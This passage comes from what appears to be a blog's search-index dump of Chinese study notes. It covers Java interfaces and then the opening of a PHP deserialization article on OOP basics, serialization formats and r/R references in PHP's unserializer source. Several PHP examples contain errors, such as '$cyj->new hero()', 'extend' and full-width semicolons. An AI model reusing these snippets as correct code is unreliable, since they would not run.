title="接口引用"></a>接口引用</h3><p>同父类一样，接口也可以声明为引用，并指向实现类对象</p><p>注:</p><ul><li>仅可调用接口中声明的方法，不可调用实现类中独有的方法</li><li>可强回转实现类本身类型，进行独有方法调用</li></ul><h3 id="接口的多态"><a href="#接口的多态" class="headerlink" title="接口的多态"></a>接口的多态</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b889ddc.png" alt="image-20240421214510628"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b71f3b7.png" alt="image-20240421214617722"></p><p><strong>不同引用类型，仅可调用自身类型中所什么的方法</strong></p><h3 id="常见关系"><a href="#常见关系" class="headerlink" title="常见关系"></a>常见关系</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b35f781.png" alt="image-20240421214803253"></p><h3 id="常量接口"><a href="#常量接口" class="headerlink" title="常量接口"></a>常量接口</h3><p>将多个常用于表示状态或固定值的变量，以静态常量的形式定义在接口中统一管理，提高代码可读性</p><h3 id="接口表示标准"><a href="#接口表示标准" class="headerlink" title="接口表示标准"></a>接口表示标准</h3><p>接口从宏观上来讲是一种标准</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUsb</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">service</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    IUsb usb;<span class="comment">//成员变量</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsbDisk</span> <span class="keyword">implements</span> <span class="title class_">IUsb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Usb service started1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsbFan</span> <span class="keyword">implements</span> <span class="title class_">IUsb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Usb service started2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">UsbDisk</span> <span class="variable">disk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbDisk</span>();</span><br><span class="line">        <span class="type">UsbFan</span> <span class="variable">fan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbFan</span>();</span><br><span class="line">        character c=<span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        c.usb=disk;</span><br><span class="line">        c.usb.service();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Usb service started1</span></span><br></pre></td></tr></table></figure><p><strong>接口除了表示约束 表示规范 接口还表示一种标记</strong></p><h3 id="接口回调"><a href="#接口回调" class="headerlink" title="接口回调"></a>接口回调</h3><p>先有接口的使用，后有接口的实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICallback</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>;<span class="comment">//抽象方法--以后要实现的功能--留给实现类去实现</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">doCall</span><span class="params">()</span>&#123;<span class="comment">//jdk8以后 接口中可以调用默认方法（用default修饰）与静态方法</span></span><br><span class="line">        call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ICallback</span> <span class="variable">call</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">CallBack</span>();<span class="comment">//反射+注解自动寻找用户类来完成对这个类的实例化</span></span><br><span class="line">        call.doCall();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallBack</span> <span class="keyword">implements</span> <span class="title class_">ICallback</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;call!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//call!</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>接口优势：</p><ul><li>程序的耦合度降低</li><li>更自然的使用多态</li><li>设计与实现完全分离</li><li>更容易搭建程序框架</li><li>更容易更换具体实现</li></ul><p><img src="https://bu.dusays.com/2024/05/13/6641a4b6ab0da.png" alt="image-20240421221459493"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 编程语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h3><p>就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了</p><p>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中按顺序调用函数</p><h3 id="面向对象-1"><a href="#面向对象-1" class="headerlink" title="面向对象"></a>面向对象</h3><p>就是把现实中的事物都抽象为“对象”。每个对象是唯一的，且都可以拥有它的属性与行为。我们就可以通过调用这些对象的方法、属性去解决问题。</p><p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成整体，是对现实世界的抽象</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>类是对一组有相同数据和相同操作的对象的定义，是对象的模板，其包含的方法和数据描述一组对象的共同行为和属性。类是在对象之上的抽象，对象则是类的具体化，是类的实例。类可有其子类，也可有其他类，形成类层次结构</p><p>类是定义了一件事物的抽象特点，它将数据的形式以这些数据上的操作封装在一起。</p><p><code>对象是具有类类型的变量，是对类的实例</code></p><p>内部构成：成员变量（属性）+成员函数（方法）</p><p>属性：定义在类内部的变量  该变量的值对外是不可见的，但是可以通过方法访问  在类被实例化后，该变量即可成为对象的属性</p><p>方法：定义在类的内部，可用于访问对象的数据</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>让某个类型的对象获得另一个类型的对象的属性和方法。继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为</p><p>父类：一个类被其他类继承，可将该类称为父类（基类、超类）</p><p>子类：一个类继承其他类，则该类被称为子类（派生类）</p><h4 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;<span class="comment">//定义类（类名）</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;<span class="comment">//声明成员变量（属性）</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>&#123;<span class="comment">//声明成员函数（方法）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;<span class="comment">//$this:调用这个类中的属性时使用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;<span class="comment">//方法传参var可直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();<span class="comment">//new:实例化对象  把他赋值为对象cyj</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;name=<span class="string">&#x27;程咬金&#x27;</span>；<span class="comment">//赋值参数</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;sex=<span class="string">&#x27;男&#x27;</span>；</span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="title function_ invoke__">jineng</span>(<span class="string">&#x27;跳跳跳&#x27;</span>);<span class="comment">//调用方法</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cyj</span>);<span class="comment">//打印</span></span><br></pre></td></tr></table></figure><h4 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h4><ul><li>public：对外公开，访问级别最高</li><li>protected：只对同一个包中的类或者子类公开</li><li>默认：只对同一个包中的类公开</li><li>private：不对外公开，只能在对象内部访问，访问级别最低<br><img src="https://img-blog.csdnimg.cn/274e6b8cc40c4c66ad93056fe6c5991b.png" alt="在这里插入图片描述"></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span> $<span class="title">this</span>-&gt;<span class="title">name</span></span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name;<span class="comment">//可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;sex;<span class="comment">//不行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;age;<span class="comment">//不行</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span> $<span class="title">this</span>-&gt;<span class="title">name</span></span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero2</span> <span class="title">extend</span> <span class="title">hero</span></span>&#123;<span class="comment">//子类</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$cyj2</span>=<span class="keyword">new</span> hero2;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name;<span class="comment">//可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj2</span>-&gt;<span class="title function_ invoke__">test</span>();<span class="comment">//sex不能触发</span></span><br></pre></td></tr></table></figure><p>方法也可以用修饰符</p><h2 id="序列化基础知识"><a href="#序列化基础知识" class="headerlink" title="序列化基础知识"></a>序列化基础知识</h2><p>序列化(serialization)（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ba145d.png" alt="image-20240221185603468"></p><table><thead><tr><th align="center">类型</th><th>例子</th><th>序列化结果</th></tr></thead><tbody><tr><td align="center">空字符</td><td>NULL</td><td>N；</td></tr><tr><td align="center">整型</td><td>666</td><td>i:666;</td></tr><tr><td align="center">浮点型</td><td>66.6</td><td>d:66.6;</td></tr><tr><td align="center">布朗型</td><td>true</td><td>b:1;</td></tr><tr><td align="center"></td><td>false</td><td>b:0;</td></tr><tr><td align="center">字符串</td><td>’benben‘</td><td>s:6(长度);”benben”</td></tr><tr><td align="center">数组</td><td>array(‘benben’,’laoli’)</td><td>a:2(参数数量)：{i:0(编号);s:6:”benben”;i:1;s:5:”laoli”;)}</td></tr></tbody></table><h3 id="r与R"><a href="#r与R" class="headerlink" title="r与R"></a>r与R</h3><p>当两个对象本来就是同一个对象时后出现的对象将会以小写<strong>r</strong>表示。<br>不过基础类型不受此条件限制，总是会被序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:1;&#125; // 基础类型</span></span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$y</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;O:8:&quot;stdClass&quot;:0:&#123;&#125;s:1:&quot;b&quot;;r:2;&#125;</span></span><br><span class="line"><span class="comment">// id(a) == id(b)，二者都是$y;</span></span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$x</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>;</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;r:1;s:1:&quot;b&quot;;r:1;&#125;</span></span><br></pre></td></tr></table></figure><p>而当PHP中的一个对象如果是对另一对象显式的<strong>引用</strong>，那么在同时对它们进行序列化时将通过大写<strong>R</strong>表示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>对于“同一个对象”，php直接对取出的对象引用进行了一次解引用，便将这个 <em><strong>对象</strong></em> 赋给了右值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;r:&quot;</span> uiv <span class="string">&quot;;&quot;</span>        &#123;</span><br><span class="line">    zend_long id;</span><br><span class="line">    *p = YYCURSOR;</span><br><span class="line">    <span class="keyword">if</span> (!var_hash) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    id = parse_uiv(start + <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// 待会说 var_hash ，先看下面几行</span></span><br><span class="line">    <span class="comment">// r begin</span></span><br><span class="line">    <span class="keyword">if</span> (rval_ref == rval) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    ZVAL_DEREF(rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(rval_ref) != IS_OBJECT) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// r end</span></span><br><span class="line">    ZVAL_COPY(rval, rval_ref);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于“对象引用”，其反序列化过程与上面小r非常像，不一样的地方在于 r begin 和 r end 之间：</p><p>php并没有对取出的引用进行解引用，直接将这个 <em><strong>引用</strong></em> 赋给了右值。<br>如果取出的引用本身指向的是一个引用，php还会进一步跟到引用指向的对象，创建一个新的指向对应对象的引用，赋给右值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 略</span></span><br><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="comment">// R begin</span></span><br><span class="line"><span class="keyword">if</span> (Z_ISUNDEF_P(rval_ref) || (Z_ISREF_P(rval_ref) &amp;&amp; Z_ISUNDEF_P(Z_REFVAL_P(rval_ref)))) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Z_ISREF_P(rval_ref)) &#123;</span><br><span class="line">    zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((*var_hash)-&gt;ref_props) &#123;</span><br><span class="line">        info = zend_hash_index_find_ptr((*var_hash)-&gt;ref_props, (<span class="type">zend_uintptr_t</span>)rval_ref);</span><br><span class="line">    &#125;</span><br><span class="line">    ZVAL_NEW_REF(rval_ref, rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (info) &#123; ZEND_REF_ADD_TYPE_SOURCE(Z_REF_P(rval_ref), info); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// R end</span></span><br><span class="line">ZVAL_COPY(rval, rval_ref);</span><br></pre></td></tr></table></figure><p><strong>R&#x2F;r后的数字：</strong></p><p>那么，R&#x2F;r后面跟的数字是怎么决定的呢？首先我们先来“黑箱分析”一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 1</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:2;&#125;               ⬇️ 注意这，变了</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:1;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">/* 压缩了一下（</span></span><br><span class="line"><span class="comment">array(2) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">  [1]=&gt; array(2) &#123;</span></span><br><span class="line"><span class="comment">    [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">    [1]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 2</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;               ⬇️ 同上</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:1;&#125; &#x27;</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(stdClass)#3 (2) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;a&quot;]=&gt; int(1)</span></span><br><span class="line"><span class="comment">  [&quot;b&quot;]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>相信大家定睛看两眼上面的例子就能猜出，R&#x2F;r后面的数字指代的是在 <em><strong>同一反序列化过程中</strong></em><br>出现过的第n个非键(key)对象（我又在瞎起名字了）</p><p>看过上面的源码以后很容易猜到，在反序列化过程中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>这一步正是上面取值的关键。在反序列化过程中我们看到 <code>php_var_unserialize_internal</code> 函数在一开头就进行了 <code>var_push(var_hash, rval);</code> 这样的操作（当然前提是反序列化的对象的标记不能是’R’，因为“引用”本身如果也计算在内，那么就有可能出现循环引用。浙恒河里），而 <code>var_push</code> 正是向列表 <code>var_hash</code> append一个新的元素。</p><blockquote><p><strong>其实</strong> <code>var_hash</code> <strong>并不单单是一个列表，只是本文为方便这么说罢了。</strong></p></blockquote><p>这时候就有同学要问了，数组的index是数字，对象的属性名是字符串，它们都存在于反序列化过程当中，为什么它们没有被append进 <code>var_hash</code> 呢？我们回头看一下 <code>var_push</code> 的条件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (var_hash &amp;&amp; (*p)[<span class="number">0</span>] != <span class="string">&#x27;R&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><p>后面那个’R’已经在恒河里了，那么前面那个 <code>var_hash</code> 非 NULL 的判断意义何在呢？<br>桥豆麻袋，<code>var_hash</code> 是哪里来的呢？<br><code>php_var_unserialize_internal</code> 的参数里有个宏</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNSERIALIZE_PARAMETER \</span></span><br><span class="line"><span class="meta">    zval *rval, const unsigned char **p, \</span></span><br><span class="line"><span class="meta">    const unsigned char *max, \</span></span><br><span class="line"><span class="meta">    php_unserialize_data_t *var_hash</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span>;</span><br></pre></td></tr></table></figure><p>自然而然地，我们回去看这个internal是怎么调用的，看看什么情况下传入的 <code>var_hash</code> 为 NULL：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 高度简化版</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;a:&lt;arr_len&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        process_nested_data(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;O:&lt;type&gt;:&lt;cnt_attrs&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        object_common(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">object_common</span><span class="params">(UNSERIALIZE_PARAMETER, zend_long elements, zend_bool has_unserialize)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    process_nested_data(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">int</span> <span class="title function_">process_nested_data</span><span class="params">(UNSERIALIZE_PARAMETER, HashTable *ht, zend_long elements, zend_object *obj)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (elements-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        zval key, *data;</span><br><span class="line">        zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">        php_var_unserialize_internal(&amp;key, p, max, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// assert type(key) == string or type(key) == long</span></span><br><span class="line">        <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">            <span class="comment">// assert string(key) in dir(obj)</span></span><br><span class="line">            <span class="comment">// obj[key] = new ref info // zend_get_typed_property_info_for_slot</span></span><br><span class="line">        &#125;</span><br><span class="line">        php_var_unserialize_internal(data, p, max, var_hash, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (info) &#123;</span><br><span class="line">            <span class="comment">// some checks</span></span><br><span class="line">            zend_ref_add_type_source(Z_REF_P(data), info);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当反序列化数组、对象这种东西的时候，只有反序列化 值时会传入 <code>var_hash</code> 这个列表， 键并不存在于这个对象中的列表中。真相大白。</p><p>注：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;a:2:&#123;i:0;r:2;i:1;R:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ben</span>=<span class="string">&#x27;laoli&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"><span 